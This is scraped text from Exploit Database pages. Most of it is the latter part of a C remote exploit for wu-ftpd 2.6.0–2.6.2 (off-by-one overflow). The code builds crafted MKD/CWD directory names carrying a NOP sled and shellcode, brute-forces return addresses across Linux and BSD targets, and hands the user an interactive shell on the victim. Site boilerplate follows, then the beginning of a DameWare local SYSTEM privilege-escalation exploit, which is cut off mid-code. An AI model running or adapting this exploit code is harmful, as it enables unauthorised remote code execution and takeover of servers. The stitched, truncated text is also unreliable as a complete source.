compile",0x0806ccaa,0x0806c082,bsd_shellcode_ffx2,(DEF_ANSH_FRBSD),(HOME_DIR_FRBSD)},{6,"OpenBSD 3.0 Version wu-2.6.0 compile",0xdfbfc8f8,0xdfbfc0f8,bsd_shellcode_ffx2,(DEF_ANSH_FRBSD),(HOME_DIR_OPBSD)},{7,"OpenBSD 3.0 Version wu-2.6.1 compile",0xdfbfc8f8,0xdfbfc0f8,bsd_shellcode_ffx2,(DEF_ANSH_FRBSD),(HOME_DIR_OPBSD)},{8,"OpenBSD 3.0 Version wu-2.6.2 compile",0xdfbfc8f8,0xdfbfc0f8,bsd_shellcode_ffx2,(DEF_ANSH_FRBSD),(HOME_DIR_OPBSD)},{0x82,NULL,0x0,0x0,NULL,0,NULL}};void prcode_usage(char *f_nm){int r_n=(NRL);fprintf(stdout," Usage: %s -options arguments\n\n",f_nm);fprintf(stdout," \t-h [hostname]   : Target hostname & ip.\n");fprintf(stdout," \t-u [userid]     : User id.\n");fprintf(stdout," \t-p [passwd]     : User password.\n");fprintf(stdout," \t-n [port num]   : Target port number.\n");fprintf(stdout," \t-s [shelladdr]  : Shellcode address.\n");fprintf(stdout," \t-m [max num]    : Brute-Force Count number.\n");fprintf(stdout," \t-i              : help information.\n");fprintf(stdout," \t-q              : banner scan mode.\n");fprintf(stdout," \t-c              : check exploit test.\n");fprintf(stdout," \t-t [target num] : Select target number.\n");fprintf(stdout," \t-b [target num] : Brute-Force mode. (Select target number)\n\n");for(r_n=(NRL);plat[r_n].v_nm!=(NULL);r_n++){fprintf(stdout," \t\t{%d} %s.\n",(plat[r_n].num),(plat[r_n].v_nm));}fprintf(stdout,"\n Example1: %s -hlocalhost -ux82 -px82 -n21 -t0",f_nm);fprintf(stdout,"\n Example2: %s -hwu_sub -ux82 -px82 -n21 -b0",f_nm);fprintf(stdout,"\n Example3: %s -h0 -ux82 -px82 -qc -t0\n\n",f_nm);exit(FAD);}u_long null_chk(u_long sh_addr){int chk_0x2f=(NRL);for(chk_0x2f=(NRL);chk_0x2f<0x20;chk_0x2f+=(DEF_ALIGN*2)){if((sh_addr>>(chk_0x2f)&0xff)==(0x2f)){fprintf(stderr," [-] slash was included to &shellcode address.\n\n");exit(FAD);}}if((sh_addr>>(NRL)&0xff)==(0x00)){return(sh_addr+=(SCS));}else return(sh_addr);}int bscann(char *chk_ban){fprintf(stdout,"\n [+] Checking, banner ...\n");if(strstr(chk_ban,"wu-2.6.0")){fprintf(stdout," [*] [wu-ftpd-2.6.0]: This is version that exploit is possible.\n\n");return(SCS);}else if(strstr(chk_ban,"wu-2.6.1")){fprintf(stdout," [*] [wu-ftpd-2.6.1]: This is version that exploit is possible.\n\n");return(SCS);}else if(strstr(chk_ban,"wu-2.6.2")){fprintf(stdout," [*] [wu-ftpd-2.6.2]: This is version that exploit is possible.\n\n");return(SCS);}else{fprintf(stdout," [x] This version does not support exploit.\n");return(FAD);}}void ftpd_login(int sock,char *user,char *pass){char send_recv[(GET_R)];(u_int)sleep(SCS);memset((char *)send_recv,(NRL),sizeof(send_recv));recv(sock,send_recv,sizeof(send_recv)-1,(NRL));if(b_scan){b_scan=(NRL);if(((int)bscann(send_recv))==(FAD)){fprintf(stdout," [-] exploit stop.\n\n");exit(FAD);}}if(!strstr(send_recv,(FTP_CONN_SCS))){fprintf(stdout," [-] ftpd connection failure.\n\n");close(sock);exit(FAD);}else fprintf(stdout," [*] ftpd connection success.\n");fprintf(stdout," [+] User id input.\n");memset((char *)send_recv,(NRL),sizeof(send_recv));snprintf(send_recv,sizeof(send_recv)-1,"USER %s\r\n",user);send(sock,send_recv,strlen(send_recv),(NRL));(u_int)sleep(SCS);memset((char *)send_recv,(NRL),sizeof(send_recv));recv(sock,send_recv,sizeof(send_recv)-1,(NRL));if(!strstr(send_recv,(FTP_USER_FAD))){fprintf(stdout," [-] User id input failure.\n\n");close(sock);exit(FAD);}else fprintf(stdout," [+] User password input.\n");memset((char *)send_recv,(NRL),sizeof(send_recv));snprintf(send_recv,sizeof(send_recv)-1,"PASS %s\r\n",pass);send(sock,send_recv,strlen(send_recv),(NRL));(u_int)sleep(SCS);memset((char *)send_recv,(NRL),sizeof(send_recv));recv(sock,send_recv,sizeof(send_recv)-1,(NRL));if(strstr(send_recv,(FTP_LOGIN_FAD))){fprintf(stdout," [-] FAILED LOGIN on %s.\n\n",user);close(sock);exit(FAD);}else if(strstr(send_recv,(FTP_LOGIN_SCS))){fprintf(stdout," [*] User %s logged in.\n",user);}else{fprintf(stdout," [-] ftpd handshake failure.\n\n");close(sock);exit(FAD);}return;}int mkd_cwd_f(int sock,int type,char *dir_nm,int gb_character){int dr_n=(NRL),cmd_f=(NRL);char get_nm[(GET_R)];memset((char *)dir_nm,(NRL),(GET_R));/* MKD command */dir_nm[cmd_f++]=(0x4d);dir_nm[cmd_f++]=(0x4b);dir_nm[cmd_f++]=(0x44);dir_nm[cmd_f++]=(0x20);for(dr_n=(cmd_f);dr_n<(DEF_VA)+(cmd_f);dr_n++){dir_nm[dr_n]=(gb_character);}dir_nm[dr_n++]=(0x0d);dir_nm[dr_n++]=(0x0a);if(type){send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST))){fprintf(stdout," [-] MKD command failed.\n\n");exit(FAD);}}/* CMD command */cmd_f=(NRL);dir_nm[cmd_f++]=(0x43);dir_nm[cmd_f++]=(0x57);dir_nm[cmd_f++]=(0x44);send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(!strstr(get_nm,(CWD_COMM_SCS))){fprintf(stdout," [-] CWD command failed.\n\n");exit(FAD);}return;}int send_shellcode(int sock,int type,char *dir_nm){int dr_n=(NRL),cmd_f=(NRL);char get_nm[(GET_R)];memset((char *)dir_nm,(NRL),(GET_R));/* MKD command */dir_nm[cmd_f++]=(0x4d);dir_nm[cmd_f++]=(0x4b);dir_nm[cmd_f++]=(0x44);dir_nm[cmd_f++]=(0x20);for(dr_n=(cmd_f);dr_n<(DEF_VA)+sizeof(0xffffffff)+(cmd_f)-strlen(plat[t_g].shellcode);dr_n++){dir_nm[dr_n]=(DEF_NOP);}for(cmd_f=(NRL);cmd_f<strlen(plat[t_g].shellcode);cmd_f++){dir_nm[dr_n++]=plat[t_g].shellcode[cmd_f];}dir_nm[dr_n++]=(0x0d);dir_nm[dr_n++]=(0x0a);if(type){send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST))){fprintf(stdout," [-] MKD shellcode_dir failed.\n\n");exit(FAD);}}/* CMD command */cmd_f=(NRL);dir_nm[cmd_f++]=(0x43);dir_nm[cmd_f++]=(0x57);dir_nm[cmd_f++]=(0x44);send(sock,dir_nm,strlen(dir_nm),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,(GET_R)-1,(NRL));if(!strstr(get_nm,(CWD_COMM_SCS))){fprintf(stdout," [-] CWD shellcode_dir failed.\n\n");exit(FAD);}return;}void make_send_exploit(int sock,int type,u_long sh_addr,int d_type){char atk_bf[(GET_R)];switch(t_g){case 0:case 1:case 2:fprintf(stdout," [+] 01: make 0x41414141 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x41));	/* 01 */fprintf(stdout," [+] 02: make shell-code directory.\n");(int)send_shellcode(sock,d_type,(atk_bf));	/* 02 */fprintf(stdout," [+] 03: make 0x43434343 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x43));	/* 03 */fprintf(stdout," [+] 04: make 0x44444444 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x44));	/* 04 */fprintf(stdout," [+] 05: make 0x45454545 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x45));	/* 05 */fprintf(stdout," [+] 06: make 0x46464646 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x46));	/* 06 */fprintf(stdout," [+] 07: make 0x47474747 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x47));	/* 07 */fprintf(stdout," [+] 08: make 0x48484848 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x48));	/* 08 */fprintf(stdout," [+] 09: make 0x49494949 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x49));	/* 09 */fprintf(stdout," [+] 10: make 0x50505050 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x50));	/* 10 */fprintf(stdout," [+] 11: make 0x51515151 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x51));	/* 11 */fprintf(stdout," [+] 12: make 0x52525252 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x52));	/* 12 */fprintf(stdout," [+] 13: make 0x53535353 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x53));	/* 13 */fprintf(stdout," [+] 14: make 0x54545454 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x54));	/* 14 */fprintf(stdout," [+] 15: make 0x55555555 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x55));	/* 15 */(int)make_retloc(sock,type,(atk_bf),sh_addr);	/* 16 */break;case 3:case 4:case 5:case 6:case 7:case 8:fprintf(stdout," [+] 01: make 0x41414141 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x41));	/* 01 */fprintf(stdout," [+] 02: make shell-code directory.\n");(int)send_shellcode(sock,d_type,(atk_bf));	/* 02 */fprintf(stdout," [+] 03: make 0x43434343 directory.\n");(int)mkd_cwd_f(sock,d_type,(atk_bf),(0x43));	/* 03 */(int)make_retloc(sock,type,(atk_bf),sh_addr);	/* 04 */break;}if(type&&__exp_test){__exp_test=(NRL);if(((int)check_exp(sock))==(FAD)){fprintf(stderr," [-] This isn't vulnerable.\n\n");exit(FAD);}}return;}int make_retloc(int sock,int type,char *atk_bf,u_long sh_addr){int r_rn_1=(NRL),r_rn_2=(NRL),cmd_f=(NRL);char get_nm[(GET_R)];memset((char *)atk_bf,(NRL),(GET_R));if(type) /* MKD command */{atk_bf[cmd_f++]=(0x4d);atk_bf[cmd_f++]=(0x4b);atk_bf[cmd_f++]=(0x44);atk_bf[cmd_f++]=(0x20);}else /* RMD command */{atk_bf[cmd_f++]=(0x52);atk_bf[cmd_f++]=(0x4d);atk_bf[cmd_f++]=(0x44);atk_bf[cmd_f++]=(0x20);}for(r_rn_1=(cmd_f),r_rn_2=(NRL);r_rn_2<(DEF_VA)-strlen(home_dir)-(plat[t_g].off_st);r_rn_2++)atk_bf[r_rn_1++]=(0x41);{int chk_0xff=(NRL);switch(t_g){case 0:case 1:case 2:/* frame pointer */*(long *)&atk_bf[r_rn_1]=0x82828282;r_rn_1+=(DEF_ALIGN);for(chk_0xff=(NRL);chk_0xff<0x20;chk_0xff+=(DEF_ALIGN*2)){if((sh_addr>>(chk_0xff)&0xff)==(0xff))atk_bf[r_rn_1++]=0xff;atk_bf[r_rn_1++]=(sh_addr>>(chk_0xff)&0xff);}break;case 3:case 4:case 5:/* frame pointer */*(long *)&atk_bf[r_rn_1]=0x82828282;r_rn_1+=(DEF_ALIGN);for(chk_0xff=(NRL);chk_0xff<0x20;chk_0xff+=(DEF_ALIGN*2)){if((sh_addr>>(chk_0xff)&0xff)==(0xff))atk_bf[r_rn_1++]=0xff;atk_bf[r_rn_1++]=(sh_addr>>(chk_0xff)&0xff);}for(r_rn_2=(NRL);r_rn_2<(DEF_ALIGN*10);r_rn_2++){atk_bf[r_rn_1++]=(0x41);}break;case 6:case 7:case 8:for(r_rn_2=(NRL);r_rn_2<(DEF_ALIGN*10);r_rn_2++){atk_bf[r_rn_1++]=(0x41);}/* frame pointer */*(long *)&atk_bf[r_rn_1]=0x82828282;r_rn_1+=(DEF_ALIGN);for(chk_0xff=(NRL);chk_0xff<0x20;chk_0xff+=(DEF_ALIGN*2)){if((sh_addr>>(chk_0xff)&0xff)==(0xff))atk_bf[r_rn_1++]=0xff;atk_bf[r_rn_1++]=(sh_addr>>(chk_0xff)&0xff);}break;}*(long *)&atk_bf[r_rn_1]=0x41414141;r_rn_1+=(DEF_ALIGN);*(long *)&atk_bf[r_rn_1]=0x0d414141;r_rn_1+=(DEF_ALIGN);atk_bf[r_rn_1++]=(0x0a);}send(sock,atk_bf,strlen(atk_bf),(NRL));(u_int)sleep(SCS);memset((char *)get_nm,(NRL),sizeof(get_nm));recv(sock,get_nm,sizeof(get_nm)-1,(NRL));if(type) /* MKD command */{if(!strstr(get_nm,(MKD_COMM_SCS))&&!strstr(get_nm,(MKD_EXIST))){fprintf(stdout," [-] MKD &shellcode_dir failed.\n\n");exit(FAD);}else fprintf(stdout," [+] Ok, MKD &shellcode_dir.\n");}else /* RMD command */{if(!strstr(get_nm,(CWD_COMM_SCS))){fprintf(stdout," [-] RMD &shellcode_dir failed.\n\n");exit(FAD);}else fprintf(stdout," [+] Ok, RMD &shellcode_dir.\n");}return;}int main(int argc,char *argv[]){int opt_g,sock,__bf=(NRL);int mx_bf=(MAX_BF),bf_lsz=(BF_LSZ);char user_id[(DEF_VA)]=(DEF_STR);char pass_wd[(DEF_VA)]=(DEF_STR);char tg_host[(DEF_VA)]=(DEF_HOST);int tg_port=(DEF_PORT);u_long sh_addr=(plat[t_g].sh_addr);(void)banrl();while((opt_g=getopt(argc,argv,"QqCcM:m:H:h:U:u:P:p:N:n:S:s:T:t:B:b:Ii"))!=EOF){extern char *optarg;switch(opt_g){case 'Q':case 'q':fprintf(stdout," [*] Banner scan mode.\n");b_scan=(SCS);break;case 'C':case 'c':fprintf(stdout," [*] Check exploit test mode.\n");__exp_test=(SCS);break;case 'M':case 'm':mx_bf=(atoi(optarg));bf_lsz=((0x1000)/mx_bf);break;case 'H':case 'h':memset((char *)tg_host,(NRL),sizeof(tg_host));strncpy(tg_host,optarg,sizeof(tg_host)-1);break;case 'U':case 'u':memset((char *)user_id,(NRL),sizeof(user_id));strncpy(user_id,optarg,sizeof(user_id)-1);break;case 'P':case 'p':memset((char *)pass_wd,(NRL),sizeof(pass_wd));strncpy(pass_wd,optarg,sizeof(pass_wd)-1);break;case 'N':case 'n':tg_port=(atoi(optarg));break;case 'S':case 's':sh_addr=strtoul(optarg,(NRL),(NRL));break;case 'T':case 't':if((t_g=(atoi(optarg)))<(9))sh_addr=(plat[t_g].sh_addr);else (void)prcode_usage(argv[(NRL)]);break;case 'B':case 'b':if((t_g=(atoi(optarg)))<(9)){sh_addr=(plat[t_g].bf_addr);__bf=(SCS);}else (void)prcode_usage(argv[(NRL)]);break;case 'I':case 'i':(void)prcode_usage(argv[(NRL)]);break;case '?':(void)prcode_usage(argv[(NRL)]);break;}}if(!strcmp(user_id,(DEF_STR))||!strcmp(pass_wd,(DEF_STR)))(void)prcode_usage(argv[(NRL)]);memset((char *)home_dir,(NRL),sizeof(home_dir));snprintf(home_dir,sizeof(home_dir)-1,"%s%s",(plat[t_g].home),user_id);if(!__bf){fprintf(stdout," [*] Target: %s.\n",(plat[t_g].v_nm));sh_addr=(u_long)null_chk(sh_addr);fprintf(stdout," [+] address: %p.\n",sh_addr);fprintf(stdout," [*] #1 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [  OK  ]\n");fprintf(stdout," [1] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [2] send exploit code.\n");(void)make_send_exploit(sock,(SCS),sh_addr,(SCS));close(sock);fprintf(stdout," [+] #2 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [  OK  ]\n");fprintf(stdout," [3] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [4] send exploit code.\n");(void)make_send_exploit(sock,(NRL),sh_addr,(NRL));fprintf(stdout," [5] Waiting, execute the shell ");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".\n");(void)conn_shell(sock,sh_addr);close(sock);}else{int bt_num=(NRL);fprintf(stdout," [*] Brute-Force mode.\n");fprintf(stdout," [+] BF Count: %d.\n",mx_bf);fprintf(stdout," [+] BF Size: +%d.\n\n",bf_lsz);for(bt_num=(NRL);bt_num<(mx_bf);bt_num++){sh_addr=(u_long)null_chk(sh_addr);fprintf(stdout," [+] Brute-Force address: %p.\n",sh_addr);fprintf(stdout," [*] #1 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [  OK  ]\n");fprintf(stdout," [1] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [2] send exploit code.\n");if(bt_num==(NRL)){(void)make_send_exploit(sock,(SCS),sh_addr,(SCS));}else{(void)make_send_exploit(sock,(SCS),sh_addr,(NRL));}close(sock);fprintf(stdout," [+] #2 Try, %s:%d ...",tg_host,tg_port);fflush(stdout);sock=(int)setsock(tg_host,tg_port);(void)re_connt(sock);fprintf(stdout," [  OK  ]\n");fprintf(stdout," [3] ftpd connection login.\n");(void)ftpd_login(sock,user_id,pass_wd);fprintf(stdout," [4] send exploit code.\n");(void)make_send_exploit(sock,(NRL),sh_addr,(NRL));fprintf(stdout," [5] Waiting, execute the shell ");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".");fflush(stdout);(u_int)sleep(SCS);fprintf(stdout,".\n");(void)conn_shell(sock,sh_addr);close(sock);sh_addr+=(bf_lsz);}}exit(NRL);}int setsock(char *u_host,int u_port){int sock;struct hostent *sxp;struct sockaddr_in sxp_addr;if((sxp=gethostbyname(u_host))==(GET_HOST_NM_ERR)){return(FAD);}if((sock=socket(AF_INET,SOCK_STREAM,(NRL)))==(FAD)){return(FAD);}sxp_addr.sin_family=AF_INET;sxp_addr.sin_port=htons(u_port);sxp_addr.sin_addr=*((struct in_addr*)sxp->h_addr);bzero(&(sxp_addr.sin_zero),(SIN_ZR_SIZE));if(connect(sock,(struct sockaddr *)&sxp_addr,sizeof(struct sockaddr))==(FAD)){return(FAD);}return(sock);}void conn_shell(int conn_sock,u_long scs_addr){int died;int ex_t=(NRL);char *command,readbuf[(GET_R)];fd_set rset;switch(t_g){case 0:case 1:case 2:case 3:case 4:case 5:command=(DEF_COMM);break;case 6:case 7:case 8:command=(DEF_COMM_OB);break;}memset((char *)readbuf,(NRL),sizeof(readbuf));fprintf(stdout," [*] Send, command packet !\n\n");send(conn_sock,command,strlen(command),(NRL));for(;;){fflush(stdout);FD_ZERO(&rset);FD_SET(conn_sock,&rset);FD_SET(STDIN_FILENO,&rset);select(conn_sock+1,&rset,NULL,NULL,NULL);if(FD_ISSET(conn_sock,&rset)){died=read(conn_sock,readbuf,sizeof(readbuf)-1);if(died<=(NRL)){if(!ex_t){fprintf(stderr," [-] exploit failure.\n\n");return;}else{fprintf(stdout," [*] exploit successfully ! (&shellcode_addr: %p)\n\n",scs_addr);exit(NRL);}}readbuf[died]=(NRL);fprintf(stdout,"%s",readbuf);}if(FD_ISSET(STDIN_FILENO,&rset)){died=read(STDIN_FILENO,readbuf,sizeof(readbuf)-1);if(died>(NRL)){readbuf[died]=(NRL);if(strstr(readbuf,"exit"))ex_t=(SCS);write(conn_sock,readbuf,died);}}}return;}void re_connt(int st_sock_va){if(st_sock_va==(FAD)){fprintf(stdout," [ Fail ]\n\n");exit(FAD);}}void banrl(){fprintf(stdout,"\n 0x82-WOOoou~Happy_new - wu-ftpd v2.6.2 off-by-one remote exploit.\n\n");}int check_exp(int sock){int conn_died;char gt_bf[(GET_R)];fprintf(stdout,"\n [+] Check exploit test ...\n");send(sock,"X82\r\n",strlen("X82\r\n"),(NRL)); /* test packet */(u_int)sleep(SCS);memset((char *)gt_bf,(NRL),sizeof(gt_bf));conn_died=read(sock,gt_bf,sizeof(gt_bf)-1);if(strstr(gt_bf,(CMD_ERROR))){fprintf(stdout," [X] After test exploit, wu-ftpd is alive.\n");return(FAD);}else if(conn_died<=(NRL)){fprintf(stdout," [*] Ok, This is vulnerable version.\n\n");return(SCS);}else return(FAD);}/* eoc */// milw0rm.com [2003-08-11]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 79
DameWare Mini Remote Control Server - System - Windows local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDDameWare Mini Remote Control Server - SystemEDB-ID:79CVE:2003-1030EDB Verified:Author:ashType:localExploit:/Platform:WindowsDate:2003-08-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*DameWare Mini Remote Control Server Local SYSTEM ExploitVulnerable Versions Prior to 3.71.0.0 by ash@felinemenace.orgThis code is based on shards.cpp by xenophile*/#define WIN32_LEAN_AND_MEAN#include <windows.h>#include <stdio.h>#pragma warning(disable: 4305)#pragma warning(disable: 4309)void MakeShellCode (char *buffer){HMODULE hCRT;void * lpSystem;int count=0;while (count < 36){buffer [count] 